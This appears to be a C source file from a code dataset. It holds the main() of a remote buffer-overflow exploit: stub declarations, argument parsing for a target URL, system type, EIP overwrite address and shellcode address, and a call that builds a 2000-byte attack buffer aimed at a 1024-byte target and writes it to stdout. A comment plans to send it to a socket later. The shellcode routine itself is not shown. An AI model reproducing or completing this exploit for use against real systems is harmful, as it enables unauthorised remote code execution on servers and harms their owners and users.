#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct system_type {unsigned int eip_address; unsigned int shellcode_address; } ;
typedef  int /*<<< orphan*/  attack_buffer ;

/* Variables and functions */
 int /*<<< orphan*/  STDOUT_FILENO ; 
 size_t atoi (char*) ; 
 int getopt (int,char**,char*) ; 
 char* optarg ; 
 int /*<<< orphan*/  parse_url (char*,char*) ; 
 int /*<<< orphan*/  prepare_attack_buffer (char*,struct system_type*,char*) ; 
 int /*<<< orphan*/  sscanf (char*,char*,unsigned int*) ; 
 struct system_type* systems ; 
 int /*<<< orphan*/  usage () ; 
 int /*<<< orphan*/  write (int /*<<< orphan*/ ,char*,int) ; 

int
main (int argc, char *argv[])
{
	char 	attack_buffer[2000];	// we construct the shellcode and stuff here
										// the target is 1024 bytes long
	struct system_type *sysptr;
	char  *url; 				// i hope these things dont get bigger than this
	char  target[2048];			// target will contain only the FQDN
	unsigned int eip_address = 0, shellcode_address = 0;
	int	ctr = 0;
	int	nop_count;
	char  *walk;
	int	arg;					 		

	// at least expect a system type and url from the command line
	if (argc < 3)
		usage ();

	// parse arguments
	while ((arg = getopt (argc, argv, "s:u:e:h:")) != -1){
		switch (arg){
			case 'h':
						sscanf (optarg, "%x", &shellcode_address);
						break;
			case 'e':
						sscanf (optarg, "%x", &eip_address);
						break;
			case 's':	
						sysptr = &systems[atoi (optarg)];
						break;
			case 'u':
						url = optarg;
						parse_url (url, target);
						break;
			case '?':
			default :	
						usage ();
		}
	}

	if (eip_address)
		sysptr->eip_address = eip_address;
	if (shellcode_address)
		sysptr->shellcode_address = shellcode_address;
	prepare_attack_buffer (attack_buffer, sysptr, url);

	// as of now write it out to stdout. later write it to a socket
	write (STDOUT_FILENO, attack_buffer, sizeof (attack_buffer));
}